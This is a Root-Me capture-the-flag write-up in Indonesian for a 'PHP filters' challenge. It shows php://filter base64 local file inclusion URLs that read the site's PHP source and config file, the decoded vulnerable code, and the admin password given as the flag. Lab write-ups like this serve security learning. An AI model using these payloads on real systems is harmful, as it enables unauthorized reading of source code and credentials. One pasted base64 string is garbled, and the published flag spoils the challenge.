@@ -1,0 +1,82 @@
+Soal : http://challenge01.root-me.org/web-serveur/ch22/
+
+	Challenge's Name : PHP filters
+	
+	Request : Retrieved the administrator password of this application
+	
+Solusi : 
+	Pada soal diminta mendapatkan administrator password
+	
+	Akses url http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php
+	
+	ada form login dan kita tidak tau username dan password, kembali lihat soal tantangannya adalah PHP filters
+	
+	mencoba inject dengan motode php://filter dengan conver ke base64 encode 
+	
+	http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=index.php
+	
+	Mendapatkan PD9waHAgaW5jbHVkZSgiY2gxMi5waHAiKTs/Pg== 
+	
+	decode base64
+	
+	root@kali:~/# echo 'PD9waHAgaW5jbHVkZSgiY2gxMi5waHAiKTs/Pg==' | base64 --decode
+	<?php include("ch12.php");?>
+
+	akses url http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=ch12.php
+	
+	mendapatkan : 
+	PD9waHAKCiRpbmM9ImFjY3VlaWwucGhwIjsKaWYgKGlzc2V0KCRfR0VUWyJpbmMiXSkpIHsKICAgICRpbmM9JF9HRVRbJ2luYyddOwogICAgaWYgKGZpbGVfZXhpc3RzKCRpbmMpKXsKCSRmPWJhc2VuYW1lKHJlYWxwYXRoKCRpbmMpKTsKCWlmICgkZiA9PSAiaW5kZXgucGhwIiB8fCAkZiA9PSAiY2gxMi5waHAiKXsKCSAgICAkaW5jPSJhY2N1ZWlsLnBocCI7Cgl9CiAgICB9Cn0KCmluY2x1ZGUoImNvbmZpZy5waHAiKTsKCgplY2hvICcKICA8aHRtbD4KICA8Ym9keT4KICAgIDxoMT5GaWxlTWFuYWdlciB2IDAuMDE8L2gxPgogICAgPHVsPgoJPGxpPjxhIGhyZWY9Ij9pbmM9YWNjdWVpbC5waHAiPmhvbWU8L2E+PC9saT4KCTxsaT48YSBocmVmPSI/aW5jPWxvZ2luLnBocCI+bG9naW48L2E+PC9saT4KICAgIDwvdWw+Cic7CmluY2x1ZGUoJGluYyk7CgplY2hvICcKICA8L2JvZHk+CiAgPC9odG1sPgonOwoKCj8+ 
+	
+	Decode base64 : 
+	
+	root@kali:~/# echo 'PD9waHAKCiRpbmM9ImFjY3VlaWwucGhwIjsKaWYgKGlzc2V0KCRfR0VUWyJpbmMiXSkpIHsKICAgICRpbmM9JF9HRVRbJ2luYyddOwogICAgaWYgKGZpPWJhc2VuYW1lKHJlYWxwYXRoKCRpbmMpKTsKCWlmICgkZiA9PSAiaW5kZXgucGhwIiB8fCAkZiA9PSAiY2gxMi5waHAiKXsKCSAgICAkaW5jPSJhY2N1ZWlsLnBocCI7Cgl9CiAgICB9Cn0KCmluY2x1ZGUoImNvbmZpZy5waHAiKTsKCgplY2hvICcKICA8aHRtbD4KICA8Ym9keT4KICAgIDxoMT5GaWxlTWFuYWdlciB2IDAuMDE8L2gxPgogICAgPHVsPgoJPGxpPjxhIGhyZWY9Ij9pbmM9YWNjdWVpbC5waHAiPmhvbWU8L2E+PC9saT4KCTxsaT48YSBocmVmPSI/aW5jPWxvZ2luLnBocCI+bG9naW48L2E+PC9saT4KICAgIDwvdWw+Cic7CmluY2x1ZGUoJGluYyk7CgplY2hvICcKICA8L2JvZHk+CiAgPC9odG1sPgonOwoKCj8+' | base64 --decode
+
+	
+	<?php
+
+	$inc="accueil.php";
+	if (isset($_GET["inc"])) {
+		$inc=$_GET['inc'];
+		if (file_exists($inc)){
+		  $f=basename(realpath($inc));
+		  if ($f == "index.php" || $f == "ch12.php"){
+			  $inc="accueil.php";
+		  }
+		}
+	}
+
+	include("config.php");
+
+
+	echo '
+	  <html>
+	  <body>
+		<h1>FileManager v 0.01</h1>
+		<ul>
+		  <li><a href="?inc=accueil.php">home</a></li>
+		  <li><a href="?inc=login.php">login</a></li>
+		</ul>
+	';
+	include($inc);
+
+	echo '
+	  </body>
+	  </html>
+	';
+?>
+
+	Terdapat file config.php akses file config.php
+	http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
+	
+	Mendapatkan: 
+	PD9waHAKCiR1c2VybmFtZT0iYWRtaW4iOwokcGFzc3dvcmQ9IkRBUHQ5RDJta3kwQVBBRiI7Cgo/Pg==
+	
+	Decode base64 : 
+	<?php
+
+		$username="admin";
+		$password="DAPt9D2mky0APAF";
+
+	?>
+	
+	Flag : DAPt9D2mky0APAF
